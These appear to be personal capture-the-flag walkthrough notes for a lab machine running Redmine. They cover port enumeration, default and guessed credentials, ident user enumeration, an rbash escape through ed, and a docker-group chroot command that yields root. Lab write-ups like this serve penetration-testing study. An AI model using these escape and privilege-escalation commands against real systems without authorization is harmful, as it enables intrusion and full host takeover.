nmap shows ports 22 ssh, 53 dns, 113 freebsd ident (?), 5432 postgresql, 8080 web, 10000 snet-sensor-mgmt?

port 113-
could do much

port 5432 -

port 8080 -
4 entries on robots
`_/issues/gantt /issues/calendar /activity /search`
Running something called "Redmine". searchsploit has some entries, but unsure of version
/login page admin:admin works
we find the version under /information, as Redmine 4.1.1.1
and Redmine scm 1.10.4
we find a metasploit exploit for an older version, so we hold off on the port, and move on

port 10000
nothing!

---
foothold -
HINT TAKEN - nmap only shows `_auth_owner nobody` on -sC flag for port 113. shows `eleanor` for port 10000. We can use the "ident-user-enum" script to see all the owners of all connections that exist. just need to run it for each port mannually
`perl /opt/ident-user-enum/ident-user-enum/ident-user-enum.pl 192.168.138.60 10000`

"The Ident service on port 113 is a network protocol used to identify the user of a TCP connection. When a connection is established, the remote host can query the Ident service to determine the username of the local user who initiated the connection."

anyways, turns out, the step forward is to ssh as eleanor:eleanor
eleanor!

---
an rbash, delightful!
there's a bin folder in eleanor's home, which has a few binaries
`chmod  chown  ed  ls  mv  ping	sleep  touch`
HINT we try to find if any of these can give a shell from gtfobins
```bash
ed
!/bin/bash
```
The issue was, the $PATH variable only pointed to /home/eleanor/bin
now since we have borken out of rsh, we can export a proper path that points to enough binaries
`PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin`
we now can run regular command binaries

But for good measure, upgrade the shell
`python -c 'import pty; pty.spawn("/bin/bash")'`
`PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin`

when we do id, we see we are a member of docker group
```zsh
id
docker images
#we see redmine and postgres
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
#root!
```
